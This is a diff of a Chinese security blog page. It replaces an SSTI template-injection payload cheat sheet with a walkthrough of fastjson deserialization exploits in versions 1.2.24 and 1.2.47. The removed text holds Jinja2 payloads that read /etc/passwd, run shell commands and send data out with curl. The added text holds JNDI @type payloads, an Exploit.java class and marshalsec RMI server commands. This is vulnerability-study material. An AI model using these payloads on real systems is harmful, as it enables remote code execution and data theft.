@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI模板注入payload记录, Fortheone">
+    <meta name="keywords" content="java反序列化——fastjson, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI模板注入payload记录 | Fortheone</title>
+    <title>java反序列化——fastjson | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI模板注入payload记录</h1>
+                    <h1 class="description center-align post-title">java反序列化——fastjson</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-03
+                    2020-07-28
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    756
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    7 分
                 </div>
                 
 
@@ -456,90 +456,219 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/ctfjennie1.jpg" width="80%">
-<a id="more"></a>
-<h3 id="0x00前言">0x00前言</h3>
-<p>模板注入也算比较老的东西了，但是偶尔可能会碰到，所以就在这里记录一些bypass方法和一些特殊的payload。</p>
-<p>基本的魔术方法</p>
-<pre><code>__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__base__   返回该对象所继承的基类
-// __base__和__mro__都是用来寻找基类的
-
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  对包含函数全局变量的字典的引用
+                <h3 id="fastjson反序列化">fastjson反序列化</h3>
+<p>环境搭建<br>
+直接到maven的仓库里找对应版本的依赖代码即可</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+    &lt;version&gt;1.2.24&lt;/version&gt;
+&lt;/dependency&gt;
 </code></pre>
-<h3 id="0x01常见的一些payload">0x01常见的一些payload</h3>
-<p>这里多数都是通过先获取到object对象，然后找到file引用来读取文件。</p>
-<pre><code>''.__class__.__mro__[2]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8]    //(jinja2中存在request对象)
+<p>然后再引入依赖即可。</p>
+<p>在fastjson中我们常说的序列化就是将java对象转换成json字符串，而反序列化就是将json字符串转换成java对象。看个例子</p>
+<p>User类</p>
+<pre><code>package fastjsontest;
+
+public class User {
+    private int age;
+    public String name;
+    public void sayHello(){
+        System.out.println(&quot;Hello, I am &quot;+name);
+    }
+    public void getName(){
+        System.out.println(name);
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+        //System.out.println(&quot;调用了setAge方法&quot;);
+    }
+
+    public void setName(String name) {
+        //System.out.println(&quot;调用了setName方法&quot;);
+        this.name = name;
+    }
+}
 </code></pre>
-<p>上面的语句都可以获得object对象，然后通过object对象列出可调用的引用列表，找到可用的引用。</p>
-<pre><code>object.__subclasses__()[40]('/etc/passwd').read()     //file类读取文件
-object.__subclasses__()[40]('/tmp').write('test')     //file类写文件
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/1.png" alt></p>
+<p>这样就可以把java对象转换位json字符串，也就是fastjson中的序列化。</p>
+<p>而fastjson在反序列化时有一个特性，就是会把反序列化对象的所有set方法执行一遍。我们在User类的set方法中都加上一个输出，然后进行反序列化，看看结果如何。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/2.png" alt></p>
+<p>可以看到这里执行了set方法中我们设置的输出。那么就可以想到和普通的反序列化一样，如果set方法中存在恶意操作，即可造成漏洞利用。</p>
+<p>但是fastjson中parseObject如果没有指定要转换成的类，就只会返回JSONObject，并且不会自动调用set方法。</p>
+<p>在fastjson中设置了可以使用 @type属性来指定要反序列的类。</p>
+<h4 id="fastjson-反序列化利用链-1-2-24">fastjson 反序列化利用链 1.2.24</h4>
+<p>我们知道在fastjson中可以通过@type属性来指定要反序列化的类，而且fastjson在反序列化时会自动执行所有setXXXX的方法，所以如果某个类的setXXXX方法中有可以利用的操作，即可造成漏洞。</p>
+<p>而在java的反序列化漏洞中最常用到的就是 lookup这个方法，它会去访问指定的rmi/ldap服务器，我们只要在自己的服务器上搭建rmi/ldap服务，并且绑定一个恶意类，通过lookup就可以造成攻击。</p>
+<p>而fastjson中刚好就有这么一个类 JdbcRowSetImpl<br>
+看一下它的setXXXX方法：</p>
+<pre><code>    public void setDataSourceName(String name) throws SQLException {
 
-object..__subclasses__()[59].__init__.func_globals['linecache'].os.system('whoami')     //os类执行命令
+        if (name == null) {
+            dataSource = null;
+        } else if (name.equals(&quot;&quot;)) {
+           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);
+        } else {
+           dataSource = name;
+        }
 
-object.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('ls').read()      //os类执行命令
-
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()                                        //os类执行命令              
+        URL = null;
+    }
 </code></pre>
-<h3 id="0x02-bypass">0x02 bypass</h3>
-<h4 id="1、过滤">1、过滤[</h4>
-<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()                            //读文件
+<pre><code>    public void setAutoCommit(boolean var1) throws SQLException {
+        if (this.conn != null) {
+            this.conn.setAutoCommit(var1);
+        } else {
+            this.conn = this.connect();
+            this.conn.setAutoCommit(var1);
+        }
 
-''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()                //执行命令
+    }
 </code></pre>
-<h4 id="2、过滤引号">2、过滤引号</h4>
-<pre><code>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
-//先获取chr()函数，赋值给chr，然后用chr拼接出要读取的文件名
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
-//要使用到request对象，在jinja2中可使用
-
-//执行命令
-{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id
+<p>在 setAutoCommit 方法中判断了如果 connect 为空就去调用 connect 方法。再看看connect方法</p>
+<pre><code>    protected Connection connect() throws SQLException {
+        if (this.conn != null) {
+            return this.conn;
+        } else if (this.getDataSourceName() != null) {
+            try {
+                InitialContext var1 = new InitialContext();
+                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+            } catch (NamingException var3) {
+                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+            }
+        } else {
+            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+        }
+    }
 </code></pre>
-<h4 id="3、过滤双下划线">3、过滤双下划线</h4>
-<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//也要用到request对象
+<p>可以看到在connect方法中有一个lookup方法，且其中的参数就是由我们在setDataSourceName设置的值。<br>
+所以得到payload</p>
+<p><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1999/Exploit&quot;,&quot;autoCommit&quot;:true}</code></p>
+<p>我们去服务器上部署rmi/ldap服务器绑定恶意类。</p>
+<p>首先创建一个恶意类 Exploit.java</p>
+<pre><code>import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;calc.exe&quot;});//执行命令打开计算器程序
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
 </code></pre>
-<h4 id="4、过滤大括号">4、过滤大括号</h4>
-<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-//利用curl将结果外带
-```
-
-
-
-#### 5、过滤了class 或者 subclasses
-
-利用 'subcla'+'sses'绕过
-
-其他的字符串过滤了也可以使用这种拼接的方式绕过
-
-
-
-#### 其他的一些payload
-
-```
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
-
-session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]         //可以获取到object对象，再根据序列号选择file或os类
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}{% endif %}{% endfor %}
-
+<p>然后javac Exploit.java 编译成class文件 开启一个简易的http服务。<br>
+python -m SimpleHTTPserver 8888</p>
+<p>然后使用marshalsec起一个rmi服务 并且绑定Exploit这个恶意类。<br>
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndRMIRefServer “<a href="http://xxx.xxx.xxx.xxx:8888/#Exploit" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8888/#Exploit</a>” 9998</p>
+<p>现在9998这个端口就绑定了Exploit恶意类，通过lookup访问该rmi服务器即可形成攻击。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/3.png" alt></p>
+<h4 id="fastjson反序列化利用链-1-2-47">fastjson反序列化利用链 &lt;=1.2.47</h4>
+<p>在fastjson1.2.24之后，使用 checkAutoType 来检验传入的反序列化类型，使用了黑白名单的方式来校验。 所以导致一些不在黑名单的类可以绕过限制，不过这些都不是这篇讨论的关键。主要看在1.2.47中通过mappings缓存绕过checkAutoType的方法。</p>
+<p>首先来看payload</p>
+<pre><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.165.93.31:1090/evil&quot;,&quot;autoCommit&quot;:&quot;true&quot;}}
 </code></pre>
-<h3 id="0x03-参考文章">0x03 参考文章</h3>
-<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
-<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/</a></p>
+<p>从payload来看，序列化了两个对象，一个是java.lang.Class 另一个就是我们要利用的jndi注入的对象 com.sun.rowset.JdbcRowSetImpl。我们接着跟进数据处理过程。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/4.png" alt></p>
+<p>在前面进行了一系列解析处理之后，取出@type的值 java.lang.Class 作为typeName传入checkAutoType中进行检查。跟进checkAutoType看看</p>
+<pre><code>
+public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+        if (typeName == null) {
+            return null;
+        }
+                //省略部分代码
+
+        if (clazz == null) {
+            clazz = TypeUtils.getClassFromMapping(typeName);//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null
+        }
+
+        if (clazz == null) {
+            clazz = deserializers.findClass(typeName);// 将typeName作为key从deserializers(IdentityHashMap)中查找对象
+        }
+
+        if (clazz != null) {
+            if (expectClass != null
+                    &amp;&amp; clazz != java.util.HashMap.class
+                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            }
+
+            return clazz;
+        }
+
+        if (!autoTypeSupport) {//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                char c = className.charAt(i);
+                hash ^= c;
+                hash *= PRIME;
+
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    if (clazz == null) {
+                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    }
+
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    }
+
+                    return clazz;
+                }
+            }
+        }
+
+        if (clazz == null) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+        }
+
+        //省略部分代码
+        return clazz;
+    }
+</code></pre>
+<p>前面经过一系列处理后进入了判断 clazz为null，然后使用 getClassFromMapping来获取对象，跟进看看<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/5.png" alt></p>
+<p>刚开始缓存中没有存入值，所以返回null。<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/6.png" alt><br>
+然后调用findClass方法，因为 java.lang.Class就在buckets中，所以直接返回 java.lang.Class。<br>
+然后因为clazz不为null了，也就跳过了黑名单的判断。然后继续回到parseObject<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/7.png" alt><br>
+通过getDeserializer获取到MiscCodec，然后调用该类的deserialze方法，跟进该方法。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/8.png" alt><br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/9.png" alt></p>
+<p>其中使用parser.parse获取到了com.sun.rowset.JdbcRowSetImpl 并赋值给 strVal<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/10.png" alt><br>
+再调用loadClass方法，其中将com.sun.rowset.JdbcRowSetImpl存入了缓存中<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/11.png" alt></p>
+<p>至此第一部分解析完成了，然后开始解析第二部分。将com.sun.rowset.JdbcRowSetImpl赋值给typename传入checkAutoType中<br>
+<img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/12.png" alt><br>
+在第一步中clazz直接可以通过 getClassFromMapping 获得，也就是缓存中的com.sun.rowset.JdbcRowSetImpl</p>
+<p>也就绕过了后面黑名单的判断。后面的反序列化过程也就和1.2.24中一样了。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/13.png" alt></p>
+<h4 id="fastjson-1-2-68-（还没有poc，暂时分析不来）">fastjson 1.2.68 （还没有poc，暂时分析不来）</h4>
 
             </div>
             <hr>
@@ -565,7 +694,7 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/01/03/ssti/">http://yoursite.com/year/01/03/ssti/</a>
+                    <a href="http://yoursite.com/year/07/28/java反序列化——fastjson/">http://yoursite.com/year/07/28/java反序列化——fastjson/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1031,28 +1160,33 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/03/04/java反序列化/">
+                <a href="/year/07/28/java反序列化——fastjson/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="java反序列化学习">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="java反序列化——fastjson">
                         
-                        <span class="card-title">java反序列化学习</span>
+                        <span class="card-title">java反序列化——fastjson</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            从一道ctf题学习java反序列化
-Java反序列化漏洞和php反序列化漏洞有着差不多的意思，php反序列化时会执行对应的魔术方法__wakeup()，而Java反序列化时会执行readObject()方法，所以如果readObject()
+                            fastjson反序列化
+环境搭建
+直接到maven的仓库里找对应版本的依赖代码即可
+&lt;dependency&gt;
+    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+    &lt;art
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1065,6 +1199,7 @@ Java反序列化漏洞和php反序列化漏洞有着差不多的意思，php反�
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1075,34 +1210,33 @@ Java反序列化漏洞和php反序列化漏洞有着差不多的意思，php反�
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/07/24/java反序列化——Commons-Collections/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="java反序列化——Commons Collections">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">java反序列化——Commons Collections</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
-
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+                            看了好久的文章才开始分析调试java的cc链，这个链算是java反序列化漏洞里的基础了。昨天分析调试的shiro也是直接使用了cc链。首先先了解一些java的反射机制。
+一、什么是反射：
+反射是Java的特征之一，是一种间接操作目标对象的机
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-24
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/总结记录/" class="post-category">
+                                    总结记录
                                 </a>
                             
                             
